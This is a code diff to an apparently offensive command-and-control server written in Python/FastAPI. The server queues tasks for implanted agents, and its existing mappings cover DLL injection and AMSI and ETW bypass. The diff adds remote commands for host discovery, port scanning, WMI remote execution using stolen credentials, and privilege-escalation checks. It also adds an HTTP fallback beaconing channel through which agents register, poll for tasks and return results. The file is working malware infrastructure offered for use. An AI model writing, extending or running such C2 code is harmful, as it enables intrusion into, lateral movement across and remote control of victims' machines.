@@ -159,6 +159,10 @@ def convert_to_rust_command(cmd: dict) -> dict:
         "inject_dll": lambda: {"inject_dll": {"pid": cmd.get("pid", 0), "dll_path": cmd.get("dll_path", "")}},
         "amsi_bypass": lambda: "amsi_bypass",
         "etw_bypass": lambda: "etw_bypass",
+        "discover_hosts": lambda: "discover_hosts",
+        "port_scan": lambda: {"port_scan": {"target": cmd.get("target", ""), "ports": cmd.get("ports")}},
+        "wmi_exec": lambda: {"wmi_exec": {"target": cmd.get("target", ""), "username": cmd.get("username", ""), "password": cmd.get("password", ""), "command": cmd.get("command", "")}},
+        "privesc_check": lambda: "privesc_check",
     }
     if cmd_type in mapping:
         return mapping[cmd_type]()
@@ -449,6 +453,98 @@ async def upload_file_to_agent(agent_id: str, file: UploadFile = File(...), dest
         "filename": file.filename,
         "size": len(file_data),
         "dest_path": dest_path,
+    }
+
+
+# ============ HTTP Fallback Channel ============
+
+http_agents: set = set()  # Track agents connected via HTTP
+
+@app.post("/api/http/register")
+async def http_register(data: dict = Body(...)):
+    """HTTP fallback registration endpoint"""
+    agent_id = data.get("agent_id", "")
+    if not agent_id:
+        return JSONResponse(status_code=400, content={"error": "No agent_id"})
+    http_agents.add(agent_id)
+    agent_manager.update_agent_info(agent_id, {
+        "hostname": data.get("hostname", "Unknown"),
+        "os": data.get("os", "Unknown"),
+        "os_version": data.get("os_version", ""),
+        "architecture": data.get("architecture", ""),
+        "user": data.get("user", ""),
+        "status": "active",
+        "channel": "http",
+    })
+    if agent_id not in agent_manager.command_queues:
+        agent_manager.command_queues[agent_id] = []
+    if agent_id not in agent_manager.command_history:
+        agent_manager.command_history[agent_id] = []
+    if agent_id not in agent_manager.beacon_log:
+        agent_manager.beacon_log[agent_id] = []
+    logger.info(f"HTTP agent registered: {agent_id}")
+    return {"status": "ok"}
+
+@app.get("/api/http/tasks/{agent_id}")
+async def http_get_tasks(agent_id: str):
+    """Poll for pending tasks via HTTP"""
+    if agent_id in agent_manager.agent_info:
+        agent_manager.agent_info[agent_id]["last_seen"] = datetime.utcnow().isoformat()
+    pending = agent_manager.get_pending_commands(agent_id)
+    tasks = []
+    for entry in pending:
+        rust_cmd = convert_to_rust_command(entry.get("command", {}))
+        tasks.append({"id": entry["cmd_id"], "command": rust_cmd})
+    return {"tasks": tasks, "sleep": 10000}
+
+@app.post("/api/http/result")
+async def http_post_result(data: dict = Body(...)):
+    """Receive command result via HTTP"""
+    agent_id = data.get("agent_id", "")
+    cmd_id = data.get("cmd_id", 0)
+    if agent_id in agent_manager.agent_info:
+        agent_manager.agent_info[agent_id]["last_seen"] = datetime.utcnow().isoformat()
+    agent_manager.store_command_result(
+        agent_id, int(cmd_id),
+        data.get("status", "success"),
+        data.get("output", ""),
+        data.get("error"),
+    )
+    return {"status": "ok"}
+
+# Patch get_live_agents to include HTTP agents
+_original_get_live_agents = get_live_agents
+@app.get("/api/live/agents", name="get_live_agents_v2")
+async def get_live_agents_with_http():
+    """Get currently connected agents (WebSocket + HTTP)"""
+    result = agent_manager.get_active_agents()
+    for aid in http_agents:
+        if aid not in result:
+            info = agent_manager.agent_info.get(aid, {}).copy()
+            info["pending_commands"] = len(agent_manager.command_queues.get(aid, []))
+            info["total_beacons"] = len(agent_manager.beacon_log.get(aid, []))
+            result[aid] = info
+    return result
+
+# Patch command endpoint to also accept HTTP agents
+@app.post("/api/live/agents/{agent_id}/command", name="send_command_v2")
+async def send_command_to_agent_v2(agent_id: str, command: dict = Body(...)):
+    """Queue a command for a connected agent (WebSocket or HTTP)"""
+    is_ws = agent_manager.is_connected(agent_id)
+    is_http = agent_id in http_agents
+    if not is_ws and not is_http:
+        return JSONResponse(
+            status_code=404,
+            content={"detail": f"Agent {agent_id} is not connected"}
+        )
+    cmd_id = agent_manager.queue_command(agent_id, command)
+    return {
+        "status": "queued",
+        "agent_id": agent_id,
+        "cmd_id": cmd_id,
+        "command": command,
+        "channel": "websocket" if is_ws else "http",
+        "queue_size": len(agent_manager.command_queues.get(agent_id, [])),
     }
 
 
